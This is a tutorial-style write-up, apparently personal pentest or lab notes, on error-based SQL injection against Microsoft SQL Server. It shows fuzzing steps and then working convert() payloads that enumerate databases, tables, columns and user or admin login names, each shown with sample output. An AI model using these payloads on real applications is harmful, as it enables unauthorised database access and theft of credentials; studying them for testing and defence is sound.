### Error-based SQL Injection

#### Fuzzing

Every form is different, but this is an example of one error-based SQLi attack I did.

1. Single quotes in the error message can be confusing when you are yourself using single quotes.  The errors break apart the text *around* your issue and put those parts in single quotes, so this error for the string `test' ` produced this error:

   ```sql
   Unclosed quotation mark after the character string 'test',')'.
   	Incorrect syntax near 'test',')'.
   ```

   This means you have an issue between `test` and `)`, and it omitted your single quote, which is what was producing the error.  From this output we can see there is a parenthesis being inserted after the input in the actual code (because we didn't put a parenthesis in our code).  So we need to insert one to close the parenthesis before we add the comments to cut off the rest of the query.

2. If you get this error with your comment inserted like `test'--`

   ```sql
   Incorrect syntax near 'test'.
   ```

   This means your command is abruptly ending, in other words you completed the first part but it's missing something at the end.

3. If you get this error with your text `test')--`

   ```
   Column name or number of supplied values does not match table definition.
   ```

   Then you have successfully completed the command, now you just need to insert your own commands between the single quote and parenthesis

#### Enumeration with Convert

Error-based SQLi can only show a limited amount of output, so enumeration is pretty slow and tedious.  This can be done with the `convert` command to try to convert text data to int, which produces an error that shows what data was trying to be converted.   When a result is found, on the next iteration, it is added to the previous results in a `not in` list to exclude them from the top match.  

This page details other SQL data types, but I couldn't get the error to show columns that were integer type, it would just give me a general error and no data.  https://www.w3schools.com/sql/sql_datatypes.asp

##### SQL Server Example

The syntax at the start and end of the command will depend on the code, but the stuff in the middle will be the same.  In this case, the format of our commands was `test' SQLCOMMAND )--`

Note:  I inserted the results of these queries after the `--` of the command.  You don't need anything after the `--` in your commands.

###### Show Database Version

```sql
',convert(int,@@version))--Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
```

###### Show Current Database

```sql
',convert(int,db_name()))--newsletter
```

###### Show Database process's username

```sql
',convert(int,user_name()))--webapp
```

###### Enumerating Databases

```sql
',convert(int,(select top(1) name from master..sysdatabases)))--master

',convert(int,(select top(1) name from master..sysdatabases where name not in ('master'))))--archive

',convert(int,(select top(1) name from master..sysdatabases where name not in ('master','archive'))))--model

',convert(int,(select top(1) name from master..sysdatabases where name not in ('master','archive','model'))))--msdb

',convert(int,(select top(1) name from master..sysdatabases where name not in ('master','archive','model','msdb'))))--newsletter

',convert(int,(select top(1) name from master..sysdatabases where name not in ('master','archive','model','msdb','newsletter'))))--tempdb

',convert(int,(select top(1) name from master..sysdatabases where name not in ('master','archive','model','msdb','newsletter','tempdb'))))-- No more results, end of query
```

###### Enumerating Tables

Note that when listing a table in a database besides the current one, you just add the database name to the front of information_schema separated by a period.

Current DB

```sql
',convert(int,(select top(1) table_name from information_schema.tables)))--users

',convert(int,(select top(1) table_name from information_schema.tables where table_name not in ('users'))))--  no response, only one table
```

Non-current DB

```sql
',convert(int,(select top(1) table_name from archive.information_schema.tables )))--pmanager

',convert(int,(select top(1) table_name from archive.information_schema.tables where table_name not in ('pmanager'))))--no data
```

###### Enumerating Table Columns

Like enumerating tables, non-current databases are referenced by adding the database name in front of  information_schema separated by a period.

Current DB

```sql
',convert(int,(select top(1) column_name from information_schema.columns where table_name='users')))--user_id

',convert(int,(select top(1) column_name from information_schema.columns where table_name='users' and column_name not in ('user_id'))))--username

',convert(int,(select top(1) column_name from information_schema.columns where table_name='users' and column_name not in ('user_id','username'))))--email

',convert(int,(select top(1) column_name from information_schema.columns where table_name='users' and column_name not in ('user_id','username','email'))))-- no response, only three columns
```

Non-current DB

```sql
',convert(int,(select top(1) column_name from archive.information_schema.columns where table_name='pmanager')))--id

',convert(int,(select top(1) column_name from archive.information_schema.columns where table_name='pmanager' and column_name not in ('id'))))--alogin

',convert(int,(select top(1) column_name from archive.information_schema.columns where table_name='pmanager' and column_name not in ('id','alogin'))))--psw

',convert(int,(select top(1) column_name from archive.information_schema.columns where table_name='pmanager' and column_name not in ('id','alogin','psw'))))--end of columns
```

###### Enumerating Data

Only one column is enumerated in each example.  With non-current databases, reference the table by adding `tablename.dbo.` in front of the table name.

Current DB

```sql
',convert(int,(select top(1) username from users)))--eric

',convert(int,(select top(1) username from users where username not in ('eric'))))--alice

',convert(int,(select top(1) username from users where username not in ('eric','alice'))))--pedro

',convert(int,(select top(1) username from users where username not in ('eric','alice','pedro'))))--admin

',convert(int,(select top(1) username from users where username not in ('eric','alice','pedro','admin'))))-- No response, end of users
```

Non-current DB

```sql
',convert(int,(select top(1) alogin from archive.dbo.pmanager)))--ftpadmin

',convert(int,(select top(1) alogin from archive.dbo.pmanager where alogin not in ('ftpadmin'))))--webadmin

',convert(int,(select top(1) alogin from archive.dbo.pmanager where alogin not in ('ftpadmin','webadmin'))))--administrator

',convert(int,(select top(1) alogin from archive.dbo.pmanager where alogin not in ('ftpadmin','webadmin','administrator'))))--eric

',convert(int,(select top(1) alogin from archive.dbo.pmanager where alogin not in ('ftpadmin','webadmin','administrator','eric'))))--No more results
```

### Links

- This is the page where I got the info to do the SQL Server example above, but also has other examples https://www.exploit-db.com/papers/12975
- This document shows another example of using Convert to extract data:  https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-(mssql).pdf